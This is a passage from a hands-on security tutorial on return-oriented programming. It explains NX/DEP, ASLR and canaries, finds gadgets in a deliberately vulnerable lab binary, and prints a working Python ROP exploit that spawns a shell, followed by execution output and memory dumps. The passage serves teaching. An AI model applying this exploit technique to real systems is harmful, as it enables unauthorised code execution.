    <p>Return-Oriented Programming or ROP for short combines a large number of short instruction sequences to build <em>gadgets</em> that allow arbitrary computation. From [3]:</p>
    <blockquote>
    <p>Return Oriented Programming (ROP) is a powerful technique used to counter common exploit prevention strategies. In particular, ROP is useful for circumventing Address Space Layout Randomization (ASLR) and NX/DEP. When using ROP, an attacker uses his/her control over the stack right before the return from a function to direct code execution to some other location in the program. Except on very hardened binaries, attackers can easily find a portion of code that is located in a fixed location (circumventing ASLR) and which is executable (circumventing DEP). Furthermore, it is relatively straightforward to chain several payloads to achieve (almost) arbitrary code execution.</p>
    </blockquote>
    <hr />
    <p><strong>Note</strong>: as in previous tutorials, there’s a docker container that facilitates reproducing the work of this tutorial. The container can be built with:</p>
    <div class="sourceCode" id="cb200"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb200-1"><a href="#cb200-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> build <span class="at">-t</span> basic_cybersecurity5:latest .</span></code></pre></div>
    <p>and runned with:</p>
    <div class="sourceCode" id="cb201"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb201-1"><a href="#cb201-1" aria-hidden="true" tabindex="-1"></a><span class="ex">docker</span> run <span class="at">--privileged</span> <span class="at">-it</span> basic_cybersecurity5:latest</span></code></pre></div>
    <hr />
    <p>The content used for this tutorial will be heavily relying on [3]. The tutorial’s objective is to learn about the basic concept of return-oriented programming (ROP).</p>
    <p>From [9]:</p>
    <blockquote>
    <h5 id="nxdep">NX/DEP</h5>
    <p>DEP stands for data execution prevention, this technique marks areas of memory as non executable. Usually the stack and heap are marked as non executable thus preventing attacker from executing code residing in these regions of memory.</p>
    </blockquote>
    <blockquote>
    <h5 id="aslr">ASLR</h5>
    <p>ASLR stands for Address Space Layer Randomization. This technique randomizes address of memory where shared libraries , stack and heap are maapped at. This prevent attacker from predicting where to take EIP , since attacker does not knows address of his malicious payload.</p>
    </blockquote>
    <blockquote>
    <h5 id="stack-canaries">Stack Canaries</h5>
    <p>In this technique compiler places a randomized guard value after stack frame’s local variables and before the saved return address. This guard is checked before function returns if it’s not same then program exits.</p>
    </blockquote>
    <p>From <code>ret-to-libc</code> to ROP</p>
    <p>From [3], &gt; With ROP, it is possible to do far more powerful things than calling a single function. In fact, we can use it to run arbitrary code6 rather than just calling functions we have available to us. We do this by returning to gadgets, which are short sequences of instructions ending in a ret. &gt; &gt; We can also use ROP to chain function calls: rather than a dummy return address, we use a pop; ret gadget to move the stack above the arguments to the first function. Since we are just using the pop; ret gadget to adjust the stack, we don’t care what register it pops into (the value will be ignored anyways). As an example, we’ll exploit the following binary</p>
    <div class="sourceCode" id="cb202"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb202-1"><a href="#cb202-1" aria-hidden="true" tabindex="-1"></a><span class="dt">char</span> string<span class="op">[</span><span class="dv">100</span><span class="op">];</span></span>
    <span id="cb202-2"><a href="#cb202-2" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb202-3"><a href="#cb202-3" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> exec_string<span class="op">()</span> <span class="op">{</span></span>
    <span id="cb202-4"><a href="#cb202-4" aria-hidden="true" tabindex="-1"></a>    system<span class="op">(</span>string<span class="op">);</span></span>
    <span id="cb202-5"><a href="#cb202-5" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb202-6"><a href="#cb202-6" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb202-7"><a href="#cb202-7" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> add_bin<span class="op">(</span><span class="dt">int</span> magic<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb202-8"><a href="#cb202-8" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>magic <span class="op">==</span> <span class="bn">0xdeadbeef</span><span class="op">)</span> <span class="op">{</span></span>
    <span id="cb202-9"><a href="#cb202-9" aria-hidden="true" tabindex="-1"></a>        strcat<span class="op">(</span>string<span class="op">,</span> <span class="st">&quot;/bin&quot;</span><span class="op">);</span></span>
    <span id="cb202-10"><a href="#cb202-10" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
    <span id="cb202-11"><a href="#cb202-11" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb202-12"><a href="#cb202-12" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb202-13"><a href="#cb202-13" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> add_sh<span class="op">(</span><span class="dt">int</span> magic1<span class="op">,</span> <span class="dt">int</span> magic2<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb202-14"><a href="#cb202-14" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>magic1 <span class="op">==</span> <span class="bn">0xcafebabe</span> <span class="op">&amp;&amp;</span> magic2 <span class="op">==</span> <span class="bn">0x0badf00d</span><span class="op">)</span> <span class="op">{</span></span>
    <span id="cb202-15"><a href="#cb202-15" aria-hidden="true" tabindex="-1"></a>        strcat<span class="op">(</span>string<span class="op">,</span> <span class="st">&quot;/sh&quot;</span><span class="op">);</span></span>
    <span id="cb202-16"><a href="#cb202-16" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
    <span id="cb202-17"><a href="#cb202-17" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb202-18"><a href="#cb202-18" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb202-19"><a href="#cb202-19" aria-hidden="true" tabindex="-1"></a><span class="dt">void</span> vulnerable_function<span class="op">(</span><span class="dt">char</span><span class="op">*</span> string<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb202-20"><a href="#cb202-20" aria-hidden="true" tabindex="-1"></a>    <span class="dt">char</span> buffer<span class="op">[</span><span class="dv">100</span><span class="op">];</span></span>
    <span id="cb202-21"><a href="#cb202-21" aria-hidden="true" tabindex="-1"></a>    strcpy<span class="op">(</span>buffer<span class="op">,</span> string<span class="op">);</span></span>
    <span id="cb202-22"><a href="#cb202-22" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
    <span id="cb202-23"><a href="#cb202-23" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb202-24"><a href="#cb202-24" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">int</span> argc<span class="op">,</span> <span class="dt">char</span><span class="op">**</span> argv<span class="op">)</span> <span class="op">{</span></span>
    <span id="cb202-25"><a href="#cb202-25" aria-hidden="true" tabindex="-1"></a>    string<span class="op">[</span><span class="dv">0</span><span class="op">]</span> <span class="op">=</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb202-26"><a href="#cb202-26" aria-hidden="true" tabindex="-1"></a>    vulnerable_function<span class="op">(</span>argv<span class="op">[</span><span class="dv">1</span><span class="op">]);</span></span>
    <span id="cb202-27"><a href="#cb202-27" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
    <span id="cb202-28"><a href="#cb202-28" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
    <p>We can see that the goal is to call <code>add_bin</code>, then <code>add_sh</code>, then <code>exec_string</code>. When we call add_bin, the stack must look like:</p>
    <pre><code>high | &lt;argument&gt;       |
    low  | &lt;return address&gt; |</code></pre>
    <p>In our case, we want the argument to be <code>0xdeadbeef</code> we want the return address to be a pop; ret gadget. This will remove <code>0xdeadbeef</code> from the stack and return to the next gadget on the stack. We thus have a gadget to call <code>add_bin(0xdeadbeef)</code> that looks like:</p>
    <pre><code>high  | 0xdeadbeef            |
          | &lt;address of pop; ret&gt; |
          | &lt;address of add_bin&gt;  |</code></pre>
    <p>(<em>this is a gadget</em>)</p>
    <p>Since <code>add_sh(0xcafebabe, 0x0badf00d)</code> use two arguments, we need a <code>pop; pop; ret</code>:</p>
    <pre><code>high  | 0x0badf00d                 |
          | 0xcafebabe                 |
          | &lt;address of pop; pop; ret&gt; |
          | &lt;address of add_sh&gt;        |</code></pre>
    <p>(<em>note how gadgets get chained with those ones executing first in the lowest memory addresses (closer to the stack pointer)</em>)</p>
    <p>Putting all of it together:</p>
    <pre><code>high    | &lt;address of exec_string&gt;     |
            | 0x0badf00d                   |
            | 0xcafebabe                   |
            | &lt;address of pop; pop; ret&gt;   |
            | &lt;address of add_sh&gt;          |
            | 0xdeadbeef                   |
            | &lt;address of pop; ret&gt;        |
            | &lt;address of add_bin&gt;         |
            | 0x42424242 (fake saved %ebp) |
            | 0x41414141 ...               |
            |   ... (0x6c bytes of &#39;A&#39;s)   |
            |   ... 0x41414141             |</code></pre>
    <p>With this diagram in mind, let’s figure out the addresses. First the functions:</p>
    <pre><code>&gt;&gt;&gt; p &amp;exec_string
    $1 = (void (*)()) 0x804844d &lt;exec_string&gt;
    &gt;&gt;&gt; p &amp;add_bin
    $2 = (void (*)(int)) 0x8048461 &lt;add_bin&gt;
    &gt;&gt;&gt; p &amp;add_sh
    $3 = (void (*)(int, int)) 0x804849c &lt;add_sh&gt;</code></pre>
    <p>To obtain the gadgets and identify the right one. To do so we could use <code>dumprop</code> from PEDA [11], or <code>rp++</code> [12]:</p>
    <pre><code>A total of 162 gadgets found.
    0x0804870b: adc al, 0x41 ; ret  ;  (1 found)
    0x08048497: add al, 0x00 ; pop edi ; pop ebp ; ret  ;  (1 found)
    0x0804830a: add al, 0x08 ; add byte [eax], al ; add byte [eax], al ; jmp dword [0x0804A00C] ;  (1 found)
    0x08048418: add al, 0x08 ; add ecx, ecx ; rep ret  ;  (1 found)
    0x080483b4: add al, 0x08 ; call eax ;  (1 found)
    0x0804843d: add al, 0x08 ; call eax ;  (1 found)
    0x080483f1: add al, 0x08 ; call edx ;  (1 found)
    0x08048304: add al, 0x08 ; jmp dword [0x0804A008] ;  (1 found)
    0x080483b0: add al, 0x24 ; and al, 0xA0 ; add al, 0x08 ; call eax ;  (1 found)
    0x080483ed: add al, 0x24 ; and al, 0xA0 ; add al, 0x08 ; call edx ;  (1 found)
    0x08048302: add al, 0xA0 ; add al, 0x08 ; jmp dword [0x0804A008] ;  (1 found)
    0x080482ff: add bh, bh ; xor eax, 0x0804A004 ; jmp dword [0x0804A008] ;  (1 found)
    0x080482fd: add byte [eax], al ; add bh, bh ; xor eax, 0x0804A004 ; jmp dword [0x0804A008] ;  (1 found)
    0x0804830c: add byte [eax], al ; add byte [eax], al ; jmp dword [0x0804A00C] ;  (1 found)
    0x0804851a: add byte [eax], al ; add byte [eax], al ; leave  ; ret  ;  (1 found)
    ...</code></pre>
    <p>In particular we filter by <code>pop</code>:</p>
    <div class="sourceCode" id="cb209"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb209-1"><a href="#cb209-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@74929f891a04:~#</span> ./rp++ <span class="at">-f</span> rop6 <span class="at">-r</span> 3 <span class="kw">|</span> <span class="fu">grep</span> pop</span>
    <span id="cb209-2"><a href="#cb209-2" aria-hidden="true" tabindex="-1"></a><span class="ex">0x08048497:</span> add al, 0x00 <span class="kw">;</span> <span class="ex">pop</span> edi <span class="kw">;</span> <span class="ex">pop</span> ebp <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-3"><a href="#cb209-3" aria-hidden="true" tabindex="-1"></a><span class="ex">0x080482f0:</span> add byte [eax], al <span class="kw">;</span> <span class="ex">add</span> esp, 0x08 <span class="kw">;</span> <span class="ex">pop</span> ebx <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-4"><a href="#cb209-4" aria-hidden="true" tabindex="-1"></a><span class="ex">0x080485a1:</span> add byte [eax], al <span class="kw">;</span> <span class="ex">add</span> esp, 0x08 <span class="kw">;</span> <span class="ex">pop</span> ebx <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-5"><a href="#cb209-5" aria-hidden="true" tabindex="-1"></a><span class="ex">0x0804859d:</span> add ebx, 0x00001A63 <span class="kw">;</span> <span class="ex">add</span> esp, 0x08 <span class="kw">;</span> <span class="ex">pop</span> ebx <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-6"><a href="#cb209-6" aria-hidden="true" tabindex="-1"></a><span class="ex">0x080482f2:</span> add esp, 0x08 <span class="kw">;</span> <span class="ex">pop</span> ebx <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-7"><a href="#cb209-7" aria-hidden="true" tabindex="-1"></a><span class="ex">0x080485a3:</span> add esp, 0x08 <span class="kw">;</span> <span class="ex">pop</span> ebx <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-8"><a href="#cb209-8" aria-hidden="true" tabindex="-1"></a><span class="ex">0x08048578:</span> fild word [ebx+0x5E5B1CC4] <span class="kw">;</span> <span class="ex">pop</span> edi <span class="kw">;</span> <span class="ex">pop</span> ebp <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-9"><a href="#cb209-9" aria-hidden="true" tabindex="-1"></a><span class="ex">0x08048493:</span> imul ebp, dword [esi-0x3A], 0x5F000440 <span class="kw">;</span> <span class="ex">pop</span> ebp <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-10"><a href="#cb209-10" aria-hidden="true" tabindex="-1"></a><span class="ex">0x080482f3:</span> les ecx,  [eax] <span class="kw">;</span> <span class="ex">pop</span> ebx <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-11"><a href="#cb209-11" aria-hidden="true" tabindex="-1"></a><span class="ex">0x080485a4:</span> les ecx,  [eax] <span class="kw">;</span> <span class="ex">pop</span> ebx <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-12"><a href="#cb209-12" aria-hidden="true" tabindex="-1"></a><span class="ex">0x08048495:</span> mov byte [eax+0x04], 0x00000000 <span class="kw">;</span> <span class="ex">pop</span> edi <span class="kw">;</span> <span class="ex">pop</span> ebp <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-13"><a href="#cb209-13" aria-hidden="true" tabindex="-1"></a><span class="ex">0x080484d3:</span> mov dword [eax], 0x0068732F <span class="kw">;</span> <span class="ex">pop</span> edi <span class="kw">;</span> <span class="ex">pop</span> ebp <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-14"><a href="#cb209-14" aria-hidden="true" tabindex="-1"></a><span class="ex">0x0804849a:</span> pop ebp <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-15"><a href="#cb209-15" aria-hidden="true" tabindex="-1"></a><span class="ex">0x080484da:</span> pop ebp <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-16"><a href="#cb209-16" aria-hidden="true" tabindex="-1"></a><span class="ex">0x0804857f:</span> pop ebp <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-17"><a href="#cb209-17" aria-hidden="true" tabindex="-1"></a><span class="ex">0x080482f5:</span> pop ebx <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-18"><a href="#cb209-18" aria-hidden="true" tabindex="-1"></a><span class="ex">0x080485a6:</span> pop ebx <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-19"><a href="#cb209-19" aria-hidden="true" tabindex="-1"></a><span class="ex">0x08048499:</span> pop edi <span class="kw">;</span> <span class="ex">pop</span> ebp <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-20"><a href="#cb209-20" aria-hidden="true" tabindex="-1"></a><span class="ex">0x080484d9:</span> pop edi <span class="kw">;</span> <span class="ex">pop</span> ebp <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-21"><a href="#cb209-21" aria-hidden="true" tabindex="-1"></a><span class="ex">0x0804857e:</span> pop edi <span class="kw">;</span> <span class="ex">pop</span> ebp <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span>
    <span id="cb209-22"><a href="#cb209-22" aria-hidden="true" tabindex="-1"></a><span class="ex">0x0804857d:</span> pop esi <span class="kw">;</span> <span class="ex">pop</span> edi <span class="kw">;</span> <span class="ex">pop</span> ebp <span class="kw">;</span> <span class="ex">ret</span>  <span class="kw">;</span>  <span class="kw">(</span><span class="ex">1</span> found<span class="kw">)</span></span></code></pre></div>
    <p>From the content above, we pick <code>0x080485a6</code> (pop; ret) and <code>0x08048499</code> (pop; pop; ret).</p>
    <p>Alternative, using <code>objdump -d rop6</code>, we can find most of this information visually.</p>
    <p>With all this information, we go ahead and build a script that puts it all together:</p>
    <div class="sourceCode" id="cb210"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb210-1"><a href="#cb210-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/python</span></span>
    <span id="cb210-2"><a href="#cb210-2" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb210-3"><a href="#cb210-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> os</span>
    <span id="cb210-4"><a href="#cb210-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> struct</span>
    <span id="cb210-5"><a href="#cb210-5" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb210-6"><a href="#cb210-6" aria-hidden="true" tabindex="-1"></a><span class="co"># These values were found with `objdump -d a.out`.</span></span>
    <span id="cb210-7"><a href="#cb210-7" aria-hidden="true" tabindex="-1"></a>pop_ret <span class="op">=</span> <span class="bn">0x080485a6</span></span>
    <span id="cb210-8"><a href="#cb210-8" aria-hidden="true" tabindex="-1"></a>pop_pop_ret <span class="op">=</span> <span class="bn">0x08048499</span></span>
    <span id="cb210-9"><a href="#cb210-9" aria-hidden="true" tabindex="-1"></a>exec_string <span class="op">=</span> <span class="bn">0x804844d</span></span>
    <span id="cb210-10"><a href="#cb210-10" aria-hidden="true" tabindex="-1"></a>add_bin <span class="op">=</span> <span class="bn">0x8048461</span></span>
    <span id="cb210-11"><a href="#cb210-11" aria-hidden="true" tabindex="-1"></a>add_sh <span class="op">=</span> <span class="bn">0x804849c</span></span>
    <span id="cb210-12"><a href="#cb210-12" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb210-13"><a href="#cb210-13" aria-hidden="true" tabindex="-1"></a><span class="co"># First, the buffer overflow.</span></span>
    <span id="cb210-14"><a href="#cb210-14" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span>  <span class="st">&quot;A&quot;</span><span class="op">*</span><span class="bn">0x6c</span></span>
    <span id="cb210-15"><a href="#cb210-15" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">&quot;BBBB&quot;</span></span>
    <span id="cb210-16"><a href="#cb210-16" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb210-17"><a href="#cb210-17" aria-hidden="true" tabindex="-1"></a><span class="co"># The add_bin(0xdeadbeef) gadget.</span></span>
    <span id="cb210-18"><a href="#cb210-18" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> struct.pack(<span class="st">&quot;I&quot;</span>, add_bin)</span>
    <span id="cb210-19"><a href="#cb210-19" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> struct.pack(<span class="st">&quot;I&quot;</span>, pop_ret)</span>
    <span id="cb210-20"><a href="#cb210-20" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> struct.pack(<span class="st">&quot;I&quot;</span>, <span class="bn">0xdeadbeef</span>)</span>
    <span id="cb210-21"><a href="#cb210-21" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb210-22"><a href="#cb210-22" aria-hidden="true" tabindex="-1"></a><span class="co"># The add_sh(0xcafebabe, 0x0badf00d) gadget.</span></span>
    <span id="cb210-23"><a href="#cb210-23" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> struct.pack(<span class="st">&quot;I&quot;</span>, add_sh)</span>
    <span id="cb210-24"><a href="#cb210-24" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> struct.pack(<span class="st">&quot;I&quot;</span>, pop_pop_ret)</span>
    <span id="cb210-25"><a href="#cb210-25" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> struct.pack(<span class="st">&quot;I&quot;</span>, <span class="bn">0xcafebabe</span>)</span>
    <span id="cb210-26"><a href="#cb210-26" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> struct.pack(<span class="st">&quot;I&quot;</span>, <span class="bn">0xbadf00d</span>)</span>
    <span id="cb210-27"><a href="#cb210-27" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb210-28"><a href="#cb210-28" aria-hidden="true" tabindex="-1"></a><span class="co"># Our final destination.</span></span>
    <span id="cb210-29"><a href="#cb210-29" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> struct.pack(<span class="st">&quot;I&quot;</span>, exec_string)</span>
    <span id="cb210-30"><a href="#cb210-30" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb210-31"><a href="#cb210-31" aria-hidden="true" tabindex="-1"></a><span class="bu">print</span>(payload)</span>
    <span id="cb210-32"><a href="#cb210-32" aria-hidden="true" tabindex="-1"></a></span>
    <span id="cb210-33"><a href="#cb210-33" aria-hidden="true" tabindex="-1"></a>os.system(<span class="st">&quot;./rop6 </span><span class="ch">\&quot;</span><span class="sc">%s</span><span class="ch">\&quot;</span><span class="st">&quot;</span> <span class="op">%</span> payload)</span></code></pre></div>
    <p>Executing this:</p>
    <div class="sourceCode" id="cb211"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb211-1"><a href="#cb211-1" aria-hidden="true" tabindex="-1"></a><span class="ex">root@5daa0de3a6d9:~#</span> python rop6_exploit.py</span>
    <span id="cb211-2"><a href="#cb211-2" aria-hidden="true" tabindex="-1"></a><span class="ex">?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBa?ﾭޜ?????</span></span>
    <span id="cb211-3"><a href="#cb211-3" aria-hidden="true" tabindex="-1"></a> <span class="ex">M?</span></span>
    <span id="cb211-4"><a href="#cb211-4" aria-hidden="true" tabindex="-1"></a><span class="co"># ls</span></span>
    <span id="cb211-5"><a href="#cb211-5" aria-hidden="true" tabindex="-1"></a><span class="ex">checksec.sh</span>  rop1    rop1_noprotection  rop2.c         rop3    rop4    rop5    rop6    rop6_exploit.py</span>
    <span id="cb211-6"><a href="#cb211-6" aria-hidden="true" tabindex="-1"></a><span class="ex">peda</span>         rop1.c  rop2       rop2_noprotection  rop3.c  rop4.c  rop5.c  rop6.c  rp++</span>
    <span id="cb211-7"><a href="#cb211-7" aria-hidden="true" tabindex="-1"></a><span class="co"># uname -a</span></span>
    <span id="cb211-8"><a href="#cb211-8" aria-hidden="true" tabindex="-1"></a><span class="ex">Linux</span> 5daa0de3a6d9 4.9.87-linuxkit-aufs <span class="co">#1 SMP Wed Mar 14 15:12:16 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></span></code></pre></div>
    <p>Let’s analyze the memory in more detail to understand the script’s behavior:</p>
    <pre><code>─── Memory ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
                esp
    0xffffd6d0 [ec d6 ff ff] 39 d9 ff ff 01 00 00 00 38 d9 ff f7 ....9.......8...
    0xffffd6e0 00 00 00 00 00 00 00 00 00 00 00 00 41 41 41 41 ............AAAA
    0xffffd6f0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd700 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd710 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd720 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd730 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd740 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
                                        ebp           ret
    0xffffd750 41 41 41 41 41 41 41 41 [42 42 42 42] [61 84 04 08] AAAAAAAABBBBa...
    0xffffd760 a6 85 04 08 ef be ad de 9c 84 04 08 99 84 04 08 ................
    0xffffd770 be ba fe ca 0d f0 ad 0b 4d 84 04 08 00 ca e3 f7 .... .. M.......
    0xffffd780 02 00 00 00 14 d8 ff ff 20 d8 ff ff 6a ae fe f7 ........ ...j...
    0xffffd790 02 00 00 00 14 d8 ff ff b4 d7 ff ff 18 a0 04 08 ................
    0xffffd7a0 2c 82 04 08 00 00 fd f7 00 00 00 00 00 00 00 00 ,...............
    0xffffd7b0 00 00 00 00 c3 b1 4c c6 d3 d5 76 fe 00 00 00 00 ......L...v.....
    0xffffd7c0 00 00 00 00 00 00 00 00 02 00 00 00 50 83 04 08 ............P...</code></pre>
    <p>Originally and after copying the argument (generated from the python script) to the stack, the <em>base pointer</em> <code>ebp</code> has the value <code>0x42424242</code> (or “BBBB”) which will lead to a segmentation error when the stack returns. Note that we’ve rewritten the return address with the address of <code>add_bin</code>, thereby, after we reach the <code>ret</code> instruction we’ll head there.</p>
    <p>The first few instructions of function <code>add_bin</code> are as follows:</p>
    <pre><code>0x08048461 add_bin+0 push   %ebp
    0x08048462 add_bin+1 mov    %esp,%ebp
    0x08048464 add_bin+3 push   %edi
    0x08048465 add_bin+4 cmpl   $0xdeadbeef,0x8(%ebp)</code></pre>
    <p>Leaving the stack as:</p>
    <pre><code>─── Memory ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
    0xffffd6d0 ec d6 ff ff 39 d9 ff ff 01 00 00 00 38 d9 ff f7 ....9.......8...
    0xffffd6e0 00 00 00 00 00 00 00 00 00 00 00 00 41 41 41 41 ............AAAA
    0xffffd6f0 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd700 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd710 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd720 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd730 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
    0xffffd740 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 AAAAAAAAAAAAAAAA
                                        esp           ebp
    0xffffd750 41 41 41 41 41 41 41 41 [00 00 00 00] [42 42 42 42] AAAAAAAA....BBBB
                ret              magic
    0xffffd760 [a6 85 04 08 ef] [be ad de 9c] 84 04 08 99 84 04 08 ................
    0xffffd770 be ba fe ca 0d f0 ad 0b 4d 84 04 08 00 ca e3 f7 .... .. M.......
    0xffffd780 02 00 00 00 14 d8 ff ff 20 d8 ff ff 6a ae fe f7 ........ ...j...
    0xffffd790 02 00 00 00 14 d8 ff ff b4 d7 ff ff 18 a0 04 08 ................
    0xffffd7a0 2c 82 04 08 00 00 fd f7 00 00 00 00 00 00 00 00 ,...............
    0xffffd7b0 00 00 00 00 c3 b1 4c c6 d3 d5 76 fe 00 00 00 00 ......L...v.....
    0xffffd7c0 00 00 00 00 00 00 00 00 02 00 00 00 50 83 04 08 ............P...</code></pre>
    <p>note that the registers <code>ebp</code> and <code>edi</code> have been pushed to the stack having the stack pointer <code>esp</code> at <code>0xffffd758</code>. Moreover, the return address of this function will be <code>0x080485a6</code> (ret) and <code>magic</code> is taken directly from the stack. After <code>add_bin</code> executes, the function returns to <code>0x080485a6</code> which we previously engineer to point to the following instructions:</p>
    <pre><code>0x080485a6 _fini+18 pop    %ebx
    0x080485a7 _fini+19 ret    </code></pre>
    <p>with a stack that looks like what follows:</p>
    <pre><code>─── Memory ───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
